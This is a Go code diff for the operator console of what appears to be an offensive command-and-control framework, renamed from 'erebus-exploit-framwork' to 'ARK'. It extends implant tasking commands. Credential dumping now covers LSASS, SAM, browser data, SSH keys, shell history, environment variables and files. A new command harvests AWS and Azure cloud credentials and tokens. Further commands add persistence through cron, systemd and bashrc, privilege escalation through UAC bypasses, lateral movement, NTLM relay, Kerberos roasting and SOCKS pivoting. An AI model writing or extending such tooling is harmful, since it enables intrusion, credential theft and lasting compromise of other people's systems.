@@ -5,9 +5,9 @@ import (
 	"strings"
 	"time"
 
-	"github.com/KKingZero/erebus-exploit-framwork/pkg/krb"
-	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
-	"github.com/KKingZero/erebus-exploit-framwork/pkg/preimplant"
+	"github.com/KKingZero/ARK/pkg/krb"
+	pb "github.com/KKingZero/ARK/pkg/pb"
+	"github.com/KKingZero/ARK/pkg/preimplant"
 	"google.golang.org/protobuf/proto"
 )
 
@@ -32,13 +32,17 @@ func (c *Commands) cmdInbound(args []string) error {
 	return preimplant.RunInbound(args)
 }
 
+func (c *Commands) cmdADCS(args []string) error {
+	return preimplant.RunADCS(args)
+}
+
 // cmdRelay runs operator-local HTTP NTLM relay helpers (no implant session required).
 func (c *Commands) cmdRelay(args []string) error {
 	return preimplant.RunRelay(args)
 }
 
 // cmdKerberos is operator-local Kerberos helpers (no implant session required for skew).
-// Subcommands: skew (more: asktgt/s4u/keylist land in Sprint B.1/B.7/B.9).
+// Subcommands: skew (host asktgt/s4u/keylist land in ark kerberos).
 func (c *Commands) cmdKerberos(args []string) error {
 	if len(args) < 1 {
 		return fmt.Errorf("usage: kerberos <skew|with-skew> --dc <host> ...")
@@ -179,12 +183,12 @@ func (c *Commands) cmdASREPRoast(args []string) error {
 
 func (c *Commands) cmdCredsDump(args []string) error {
 	if len(args) < 1 {
-		return fmt.Errorf("usage: creds-dump <lsass|sam|browser>")
+		return fmt.Errorf("usage: creds-dump <lsass|sam|browser|ssh_keys|history|env|files>")
 	}
 	switch args[0] {
-	case "lsass", "sam", "browser":
+	case "lsass", "sam", "browser", "ssh_keys", "history", "env", "files":
 	default:
-		return fmt.Errorf("unknown creds-dump method %q (use lsass, sam, or browser)", args[0])
+		return fmt.Errorf("unknown creds-dump method %q (use lsass, sam, browser, ssh_keys, history, env, files)", args[0])
 	}
 	cfg := &pb.CredDumpConfig{Method: args[0]}
 	return c.runTypedTask(pb.TaskType_TASK_CREDS_DUMP, cfg, true, printTypedResult)
@@ -296,9 +300,42 @@ func (c *Commands) cmdLateral(args []string) error {
 	return c.runTypedTask(pb.TaskType_TASK_LATERAL_MOVE, cfg, true, printTypedResult)
 }
 
+func (c *Commands) cmdCloud(args []string) error {
+	if len(args) < 1 {
+		return fmt.Errorf("usage: cloud <aws|azure|all> [env|creds|cli|imds|all|sts-caller|me]")
+	}
+	cfg := &pb.CloudHarvestConfig{Provider: args[0], Method: "all"}
+	if len(args) >= 2 {
+		cfg.Method = args[1]
+	}
+	inner, err := proto.Marshal(cfg)
+	if err != nil {
+		return err
+	}
+	return c.runTypedTask(pb.TaskType_TASK_MODULE, &pb.ModuleTask{
+		ModuleName: "cloud",
+		Config:     inner,
+	}, true, func(_ pb.TaskType, result *pb.TaskResult) {
+		if result == nil {
+			return
+		}
+		if !result.Success {
+			fmt.Printf("FAILED: %s\n", result.Error)
+			return
+		}
+		r := &pb.CloudHarvestResult{}
+		if err := proto.Unmarshal(result.Data, r); err != nil {
+			fmt.Printf("OK cloud (%dms)\n", result.ExecutionTimeMs)
+			return
+		}
+		fmt.Printf("OK (%dms) cloud provider=%s method=%s creds=%d tokens=%d\n",
+			result.ExecutionTimeMs, r.Provider, r.Method, len(r.Credentials), len(r.Tokens))
+	})
+}
+
 func (c *Commands) cmdPersist(args []string) error {
 	if len(args) < 1 {
-		return fmt.Errorf("usage: persist <schtask|registry|service> [options]")
+		return fmt.Errorf("usage: persist <schtask|registry|service|cron|systemd_user|bashrc> [--path P] [--name N] [--trigger add|remove]")
 	}
 	cfg := &pb.PersistConfig{Method: args[0]}
 	if err := parseKVFlags(args[1:], map[string]func(string){
@@ -313,7 +350,7 @@ func (c *Commands) cmdPersist(args []string) error {
 
 func (c *Commands) cmdPrivesc(args []string) error {
 	if len(args) < 1 {
-		return fmt.Errorf("usage: privesc <token|uac_fodhelper|uac_eventvwr> [--pid N] [--command cmd]")
+		return fmt.Errorf("usage: privesc <token|uac_fodhelper|uac_eventvwr|enum> [--pid N] [--command cmd]")
 	}
 	cfg := &pb.PrivescConfig{Method: args[0]}
 	if err := parseKVFlags(args[1:], map[string]func(string){
@@ -366,6 +403,18 @@ func printTypedResult(taskType pb.TaskType, result *pb.TaskResult) {
 		r := &pb.CredDumpResult{}
 		if err := proto.Unmarshal(result.Data, r); err == nil {
 			fmt.Printf("OK (%dms) creds-dump %s: %d credentials\n", result.ExecutionTimeMs, r.Method, len(r.Credentials))
+			return
+		}
+	case pb.TaskType_TASK_SOCKS_START:
+		r := &pb.SocksStartResult{}
+		if err := proto.Unmarshal(result.Data, r); err == nil {
+			fmt.Printf("OK (%dms) socks start success=%v port=%d\n", result.ExecutionTimeMs, r.Success, r.Port)
+			return
+		}
+	case pb.TaskType_TASK_SOCKS_STOP:
+		r := &pb.SocksStopResult{}
+		if err := proto.Unmarshal(result.Data, r); err == nil {
+			fmt.Printf("OK (%dms) socks stop success=%v\n", result.ExecutionTimeMs, r.Success)
 			return
 		}
 	case pb.TaskType_TASK_LATERAL_MOVE:
